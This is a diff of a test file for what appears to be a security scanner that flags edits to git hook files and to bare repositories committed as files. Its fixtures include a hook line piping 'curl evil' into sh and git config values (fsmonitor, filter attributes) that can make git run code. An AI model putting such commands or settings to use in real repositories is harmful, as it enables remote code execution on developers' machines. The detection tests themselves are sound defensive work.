@@ -80,6 +80,7 @@ describe('a git hook file a change adds or edits', () => {
       'evil/hooks/post-checkout': 'echo\n',
     };
     expect(changedIn(bare, { 'evil/hooks/post-checkout': 'curl evil | sh\n' })).toEqual([
+      'changed nested-bare-repo evil/hooks/post-checkout',
       'changed git-hook-file evil/hooks/post-checkout',
     ]);
   });
@@ -166,5 +167,27 @@ describe('where git looks for hooks, when it is not plain', () => {
         { 'docs/x.md': 'x\n' },
       ),
     ).toContain('new unreadable-config evil/config');
+  });
+});
+
+/** Git reads every file of a bare repository committed as files when it runs there: any edit fails. */
+describe('a file of a bare repository committed as files', () => {
+  const bare = {
+    'b/HEAD': 'ref: refs/heads/main\n',
+    'b/config': '[core]\n\tbare = true\n',
+    'b/objects/x': '\n',
+    'b/refs/x': '\n',
+  };
+
+  it.each([
+    ['b/config', '[core]\n\tbare = true\n\tfsmonitor = /tmp/x\n'],
+    ['b/config.worktree', '[core]\n\tfsmonitor = /tmp/x\n'],
+    ['b/info/attributes', '* filter=x\n'],
+    ['b/commondir', '../elsewhere\n'],
+    ['b/HEAD', 'ref: refs/heads/evil\n'],
+  ])('fails a change to %s', (path, text) => {
+    expect(changedIn(bare, { [path]: text })).toContain(
+      `${path === 'b/config' || path === 'b/HEAD' ? 'changed' : 'new'} nested-bare-repo ${path}`,
+    );
   });
 });
